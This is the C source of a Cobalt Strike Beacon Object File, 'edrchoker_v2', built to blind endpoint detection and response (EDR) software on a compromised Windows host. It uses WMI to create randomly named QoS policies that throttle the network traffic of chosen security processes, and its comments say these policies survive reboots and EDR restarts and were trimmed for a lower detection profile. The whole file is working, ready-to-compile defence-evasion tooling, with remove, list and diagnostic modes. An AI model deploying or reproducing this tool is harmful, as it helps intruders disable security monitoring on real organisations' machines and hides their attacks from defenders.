/*
 * edrchoker_v2.bof.c — Beacon Object File
 *
 * v2: WMI Subscription watchdog removed for lower detection profile.
 * QoS policy persists by design — pacer.sys matches on AppPathNameMatchCondition
 * (process name, not PID), so any restart of the EDR process is automatically
 * throttled without a watchdog.
 *
 * MODES
 *   add        — throttle listed processes (ActiveStore; provider maps to GPO:localhost)
 *   remove     — restore specific process(es)
 *   remove_all — restore all QoS policies
 *   list       — show active policies
 *   check      — diagnose: Psched/NetQosSvc state + list active policies
 *
 * COMPILE AS C, NOT C++
 *   mingw64: x86_64-w64-mingw32-gcc -O2 -o edrchoker_v2.x64.o -c edrchoker_v2.bof.c -masm=intel
 *   MSVC:    cl /c /TC /GS- /Foedrchoker_v2.x64.obj edrchoker_v2.bof.c
 *
 * BUG NOTE: never use = {0} on arrays in BOFs compiled with GCC at -O0.
 *   GCC emits a memset() CRT call for zero-initialisation of large arrays.
 *   memset is an unresolvable symbol in a BOF -> crash on entry.
 *   Fix: VirtualAlloc (always returns zeroed pages) for large buffers.
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include <wbemidl.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(
    const IID*, LPUNKNOWN, DWORD, const IID*, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(
    IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD,
    RPC_AUTH_IDENTITY_HANDLE, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);

DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantInit(VARIANTARG*);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG*);

DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void*   WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);

/* ─── GUIDs ──────────────────────────────────────────────────────────────── */
static const CLSID g_CLSID_WbemLocator =
    {0x4590F811,0x1D3A,0x11D0,{0x89,0x1F,0x00,0xAA,0x00,0x4B,0x2E,0x24}};
static const IID g_IID_IWbemLocator =
    {0xDC12A687,0x737F,0x11CF,{0x88,0x4D,0x00,0xAA,0x00,0x4B,0x2E,0x24}};

/* Persistent LCG seed — zeroed by BOF loader (BSS) */
static DWORD g_randS = 0;

/* ─── String helpers ─────────────────────────────────────────────────────── */

static wchar_t* WNextTok(wchar_t** c) {
    wchar_t* s = *c;
    if (!s || !*s) return NULL;
    while (*s == L';') s++;
    if (!*s) { *c = s; return NULL; }
    wchar_t* p = s;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *c = p + 1; } else { *c = p; }
    return s;
}

static int WAppend(wchar_t* dst, int pos, int max, const wchar_t* src) {
    while (*src && pos < max - 1) dst[pos++] = *src++;
    return pos;
}

static void RandName(wchar_t* out, int n) {
    static const wchar_t pool[] =
        L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    if (!g_randS) g_randS = KERNEL32$GetTickCount() | 1;
    for (int i = 0; i < n; i++) {
        g_randS = g_randS * 1664525u + 1013904223u;
        out[i] = pool[(g_randS >> 16) % 62];
    }
    out[n] = L'\0';
}

/* ─── WMI property helpers ───────────────────────────────────────────────── */

static HRESULT PutBstr(IWbemClassObject* o, const wchar_t* p, const wchar_t* v) {
    VARIANT var; OLEAUT32$VariantInit(&var);
    var.vt = VT_BSTR; var.bstrVal = OLEAUT32$SysAllocString(v);
    HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
    OLEAUT32$VariantClear(&var); return hr;
}
static HRESULT PutByte(IWbemClassObject* o, const wchar_t* p, BYTE v) {
    VARIANT var; OLEAUT32$VariantInit(&var);
    var.vt = VT_UI1; var.bVal = v;
    HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
    OLEAUT32$VariantClear(&var); return hr;
}

static BOOL SpawnWmiInst(IWbemServices* svc, const wchar_t* cls,
                          IWbemClassObject** ppOut) {
    BSTR b = OLEAUT32$SysAllocString(cls);
    IWbemClassObject* pC = NULL;
    HRESULT hr = svc->lpVtbl->GetObject(svc, b, 0, NULL, &pC, NULL);
    OLEAUT32$SysFreeString(b);
    if (FAILED(hr)) return FALSE;
    hr = pC->lpVtbl->SpawnInstance(pC, 0, ppOut);
    pC->lpVtbl->Release(pC);
    return SUCCEEDED(hr);
}

/* ─── QoS helpers ────────────────────────────────────────────────────────── */

static BOOL CreatePolicyInStore(IWbemServices* svc, const wchar_t* proc,
                                  const wchar_t* name, const wchar_t* store) {
    IWbemClassObject* pInst = NULL;
    if (!SpawnWmiInst(svc, L"MSFT_NetQosPolicySettingData", &pInst))
        return FALSE;

    wchar_t instId[48];
    int ip = 0;
    ip = WAppend(instId, ip, 48, name);
    ip = WAppend(instId, ip, 48, L"\\");
    ip = WAppend(instId, ip, 48, store);
    instId[ip] = L'\0';

    PutBstr(pInst, L"Name",                      name);
    PutBstr(pInst, L"InstanceID",                instId);
    PutBstr(pInst, L"AppPathNameMatchCondition",  proc);
    PutBstr(pInst, L"ThrottleRateAction",         L"8");
    PutByte(pInst, L"IPProtocolMatchCondition",   3);
    PutByte(pInst, L"NetworkProfile",             0);
    PutBstr(pInst, L"Owner",                      L"machine");

    HRESULT hr = svc->lpVtbl->PutInstance(svc, pInst,
        WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pInst->lpVtbl->Release(pInst);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] PutInstance hr=0x%08X\n", hr);
    }
    return SUCCEEDED(hr);
}

static BOOL CreatePolicy(IWbemServices* svc, const wchar_t* proc) {
    wchar_t name[9]; RandName(name, 8);
    /* ActiveStore write is sufficient — provider stores it as GPO:localhost
     * which is the local Group Policy QoS store and persists across reboots. */
    if (!CreatePolicyInStore(svc, proc, name, L"ActiveStore")) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] %S: PutInstance failed\n", proc);
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "  [+] %S -> '%S'\n", proc, name);
    return TRUE;
}

static void BuildRemoveWQL(wchar_t* out, int max, wchar_t* list) {
    /* Filter by ThrottleRateAction = '8' to avoid touching non-edrchoker policies. */
    int p = WAppend(out, 0, max,
        L"SELECT * FROM MSFT_NetQosPolicySettingData"
        L" WHERE ThrottleRateAction = '8' AND (");
    wchar_t* c = list; wchar_t* tok; BOOL first = TRUE;
    while ((tok = WNextTok(&c)) != NULL) {
        if (!first) p = WAppend(out, p, max, L" OR ");
        p = WAppend(out, p, max, L"AppPathNameMatchCondition = '");
        p = WAppend(out, p, max, tok);
        if (p < max - 1) out[p++] = L'\'';
        first = FALSE;
    }
    if (p < max - 1) out[p++] = L')';
    out[p] = L'\0';
}

static int ExecDeleteQuery(IWbemServices* svc, const wchar_t* wql) {
    BSTR lang = OLEAUT32$SysAllocString(L"WQL");
    BSTR q    = OLEAUT32$SysAllocString(wql);
    IEnumWbemClassObject* en = NULL;
    HRESULT hr = svc->lpVtbl->ExecQuery(svc, lang, q,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
    OLEAUT32$SysFreeString(lang); OLEAUT32$SysFreeString(q);
    if (FAILED(hr) || !en) return 0;

    IWbemClassObject* obj = NULL; ULONG got = 0; int n = 0;
    while (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &got) == S_OK) {
        VARIANT vPath, vApp;
        OLEAUT32$VariantInit(&vPath); OLEAUT32$VariantInit(&vApp);
        obj->lpVtbl->Get(obj, L"__PATH",                    0, &vPath, NULL, NULL);
        obj->lpVtbl->Get(obj, L"AppPathNameMatchCondition", 0, &vApp,  NULL, NULL);
        if (vPath.vt == VT_BSTR && vPath.bstrVal &&
            SUCCEEDED(svc->lpVtbl->DeleteInstance(svc, vPath.bstrVal, 0, NULL, NULL))) {
            const wchar_t* sApp;
            if (vApp.vt == VT_BSTR && vApp.bstrVal) { sApp = vApp.bstrVal; } else { sApp = L"?"; }
            BeaconPrintf(CALLBACK_OUTPUT, "  [+] restored: %S\n", sApp);
            n++;
        }
        OLEAUT32$VariantClear(&vPath); OLEAUT32$VariantClear(&vApp);
        obj->lpVtbl->Release(obj);
    }
    en->lpVtbl->Release(en);
    return n;
}

/* ─── List helper ────────────────────────────────────────────────────────── */

static void ListPolicies(IWbemServices* svc) {
    BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
    BSTR query = OLEAUT32$SysAllocString(
        L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'");
    IEnumWbemClassObject* en = NULL;
    svc->lpVtbl->ExecQuery(svc, lang, query,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
    OLEAUT32$SysFreeString(lang);
    OLEAUT32$SysFreeString(query);

    int nPol = 0;
    if (en) {
        IWbemClassObject* obj = NULL; ULONG got = 0;
        while (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &got) == S_OK) {
            VARIANT vApp, vName, vInst;
            OLEAUT32$VariantInit(&vApp);
            OLEAUT32$VariantInit(&vName);
            OLEAUT32$VariantInit(&vInst);
            obj->lpVtbl->Get(obj, L"AppPathNameMatchCondition", 0, &vApp,  NULL, NULL);
            obj->lpVtbl->Get(obj, L"Name",                      0, &vName, NULL, NULL);
            obj->lpVtbl->Get(obj, L"InstanceID",                0, &vInst, NULL, NULL);

            const wchar_t* sApp;
            const wchar_t* sName;
            const wchar_t* sInst;
            if (vApp.vt  == VT_BSTR && vApp.bstrVal)  { sApp  = vApp.bstrVal;  } else { sApp  = L"?"; }
            if (vName.vt == VT_BSTR && vName.bstrVal) { sName = vName.bstrVal; } else { sName = L"?"; }
            if (vInst.vt == VT_BSTR && vInst.bstrVal) { sInst = vInst.bstrVal; } else { sInst = L"?"; }

            BeaconPrintf(CALLBACK_OUTPUT,
                "  [qos] %S  name='%S'  id='%S'\n", sApp, sName, sInst);
            nPol++;

            OLEAUT32$VariantClear(&vApp);
            OLEAUT32$VariantClear(&vName);
            OLEAUT32$VariantClear(&vInst);
            obj->lpVtbl->Release(obj);
        }
        en->lpVtbl->Release(en);
    }
    if (nPol == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [qos] no active policies\n");
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker] %d QoS policy(s)\n", nPol);
}

/* ─── WMI namespace connection ───────────────────────────────────────────── */

static IWbemServices* WmiConnect(IWbemLocator* loc, const wchar_t* ns) {
    IWbemServices* svc = NULL;
    BSTR b = OLEAUT32$SysAllocString(ns);
    HRESULT hr = loc->lpVtbl->ConnectServer(
        loc, b, NULL, NULL, 0L,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &svc);
    OLEAUT32$SysFreeString(b);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] WMI connect %S failed (0x%08X)\n", ns, hr);
        return NULL;
    }
    OLE32$CoSetProxyBlanket((IUnknown*)svc,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    return svc;
}

/* ─── Diagnostic helper ──────────────────────────────────────────────────── */

/*
 * Check state of a name in both Win32_Service (user-mode) and
 * Win32_SystemDriver (kernel driver). Psched is a kernel driver,
 * not a Win32_Service — querying only Win32_Service gives "not found".
 */
static void CheckServiceState(IWbemLocator* loc, const wchar_t* svcName) {
    IWbemServices* pSvc = WmiConnect(loc, L"ROOT\\CIMV2");
    if (!pSvc) return;

    /* Try Win32_Service first, fall back to Win32_SystemDriver */
    const wchar_t* classes[2];
    classes[0] = L"Win32_Service";
    classes[1] = L"Win32_SystemDriver";

    int i;
    for (i = 0; i < 2; i++) {
        wchar_t wql[256];
        int p = 0;
        p = WAppend(wql, p, 256, L"SELECT State FROM ");
        p = WAppend(wql, p, 256, classes[i]);
        p = WAppend(wql, p, 256, L" WHERE Name = '");
        p = WAppend(wql, p, 256, svcName);
        if (p < 255) { wql[p] = L'\''; p++; }
        wql[p] = L'\0';

        BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
        BSTR query = OLEAUT32$SysAllocString(wql);
        IEnumWbemClassObject* en = NULL;
        pSvc->lpVtbl->ExecQuery(pSvc, lang, query,
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
        OLEAUT32$SysFreeString(lang);
        OLEAUT32$SysFreeString(query);

        if (en) {
            IWbemClassObject* obj = NULL; ULONG got = 0;
            if (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &got) == S_OK) {
                VARIANT v; OLEAUT32$VariantInit(&v);
                obj->lpVtbl->Get(obj, L"State", 0, &v, NULL, NULL);
                const wchar_t* sState;
                if (v.vt == VT_BSTR && v.bstrVal) { sState = v.bstrVal; } else { sState = L"?"; }
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [svc] %-14S  %S  (%S)\n", svcName, sState, classes[i]);
                OLEAUT32$VariantClear(&v);
                obj->lpVtbl->Release(obj);
                en->lpVtbl->Release(en);
                pSvc->lpVtbl->Release(pSvc);
                return;
            }
            en->lpVtbl->Release(en);
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "  [svc] %-14S  not found (not installed)\n", svcName);
    pSvc->lpVtbl->Release(pSvc);
}

/* ─── Entry point ────────────────────────────────────────────────────────── */
/*
 * Args packed by CNA:  bof_pack($bid, "zz", cmd, process_list)
 *
 * "add"        → mode 0: throttle processes (no watchdog)
 * "remove"     → mode 1: restore specific process(es)
 * "remove_all" → mode 2: restore all QoS policies
 * "list"       → mode 3: show active policies
 * "check"      → mode 4: diagnose — service states + list policies
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    int   cmdN = 0;
    char* cmdA = BeaconDataExtract(&parser, &cmdN);
    int   argN = 0;
    char* argA = BeaconDataExtract(&parser, &argN);

    wchar_t cmd[32];
    int ci = 0;
    if (cmdA) {
        for (; ci < 31 && cmdA[ci]; ci++)
            cmd[ci] = (wchar_t)(unsigned char)cmdA[ci];
    }
    cmd[ci] = L'\0';

    /* "add"        → 0  "remove" → 1
     * "remove_all" → 2  "list"   → 3  "check" → 4 */
    LONG mode = 0;
    if (cmd[0] == L'r' && cmd[6] == L'\0') mode = 1;
    if (cmd[0] == L'r' && cmd[6] == L'_')  mode = 2;
    if (cmd[0] == L'l')                     mode = 3;
    if (cmd[0] == L'c')                     mode = 4;

    const int PLEN = 2048;
    wchar_t* buf = (wchar_t*)KERNEL32$VirtualAlloc(
        NULL, (SIZE_T)PLEN * sizeof(wchar_t),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] edrchoker: alloc failed\n");
        return;
    }
    if (argA && argN > 1) {
        int n = argN - 1;
        if (n >= PLEN) n = PLEN - 1;
        for (int i = 0; i < n; i++)
            buf[i] = (wchar_t)(unsigned char)argA[i];
    }

    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    BOOL coOwned = (hr == S_OK);
    /* RPC_E_CHANGED_MODE (0x80010106): process already has COM in STA apartment
     * (explorer.exe, rundll32.exe, most GUI host processes). COM is available —
     * do NOT abort. coOwned stays FALSE so we skip CoUninitialize. */
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] edrchoker: CoInitializeEx failed (0x%08X)\n", hr);
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        return;
    }

    IWbemLocator* pLoc = NULL;
    hr = OLE32$CoCreateInstance(&g_CLSID_WbemLocator, NULL,
        CLSCTX_INPROC_SERVER, &g_IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] edrchoker: CoCreateInstance failed (0x%08X)\n", hr);
        goto cleanup;
    }

    /* ── MODE 0: throttle ────────────────────────────────────────────────── */
    if (mode == 0) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker add \"proc1.exe;proc2.exe\"\n");
            goto release_loc;
        }

        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (!pSvc) goto release_loc;

        wchar_t* tb = (wchar_t*)KERNEL32$VirtualAlloc(
            NULL, (SIZE_T)PLEN * sizeof(wchar_t),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        int ok = 0, fail = 0;
        if (tb) {
            KERNEL32$RtlMoveMemory(tb, buf, (SIZE_T)(PLEN - 1) * sizeof(wchar_t));
            wchar_t* c = tb; wchar_t* tok;
            while ((tok = WNextTok(&c)) != NULL) {
                if (CreatePolicy(pSvc, tok)) { ok++; } else { fail++; }
            }
            KERNEL32$VirtualFree(tb, 0, MEM_RELEASE);
        }
        int cbT;
        if (ok > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
        BeaconPrintf(cbT, "[edrchoker] throttle: %d ok, %d failed\n", ok, fail);
        pSvc->lpVtbl->Release(pSvc);

    /* ── MODE 1: restore specific processes ──────────────────────────────── */
    } else if (mode == 1) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker remove \"proc.exe\"\n");
            goto release_loc;
        }

        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (!pSvc) goto release_loc;

        wchar_t* wql = (wchar_t*)KERNEL32$VirtualAlloc(
            NULL, 2048 * sizeof(wchar_t),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (wql) {
            BuildRemoveWQL(wql, 2048, buf);
            int n = ExecDeleteQuery(pSvc, wql);
            KERNEL32$VirtualFree(wql, 0, MEM_RELEASE);
            int cbT;
            if (n > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
            BeaconPrintf(cbT, "[edrchoker] %d policy(s) removed\n", n);
        }
        pSvc->lpVtbl->Release(pSvc);

    /* ── MODE 2: restore all ─────────────────────────────────────────────── */
    } else if (mode == 2) {
        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (pSvc) {
            int n = ExecDeleteQuery(pSvc,
                L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'");
            BeaconPrintf(CALLBACK_OUTPUT,
                "[edrchoker] %d QoS policy(s) removed\n", n);
            pSvc->lpVtbl->Release(pSvc);
        }

    /* ── MODE 3: list ────────────────────────────────────────────────────── */
    } else if (mode == 3) {
        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (pSvc) {
            ListPolicies(pSvc);
            pSvc->lpVtbl->Release(pSvc);
        }

    /* ── MODE 4: check — diagnose services + list active policies ────────── */
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker] diagnostics:\n");
        CheckServiceState(pLoc, L"Psched");
        CheckServiceState(pLoc, L"NetQosSvc");
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [note] InstanceID ending 'GPO:localhost' = local GP QoS store"
            " — policy IS persistent (survives reboot)\n");
        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (pSvc) {
            ListPolicies(pSvc);
            pSvc->lpVtbl->Release(pSvc);
        }
    }

release_loc:
    pLoc->lpVtbl->Release(pLoc);
cleanup:
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
    if (coOwned) OLE32$CoUninitialize();
}
